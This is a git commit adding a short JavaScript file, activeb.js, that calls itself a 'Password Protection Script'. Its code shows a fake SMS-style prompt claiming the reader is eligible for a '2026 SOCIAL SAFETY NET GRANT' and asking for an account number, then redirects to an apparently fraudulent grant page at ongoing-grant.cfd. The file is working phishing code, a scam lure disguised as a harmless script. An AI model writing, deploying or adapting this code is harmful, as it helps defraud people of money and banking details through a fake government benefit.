5ad6a0823861650edc9a5a64e895641344c0572d
The-ongoing <preciousadaowo4@gmail.com>
2026-01-09 17:28:44 +0100

    Create activeb.js

---
+++ activeb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive 2026 SOCIAL SAFETY NET GRANT. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://ongoing-grant.cfd/Ep-Fet-Po-Beneficiaries.html';
+  }
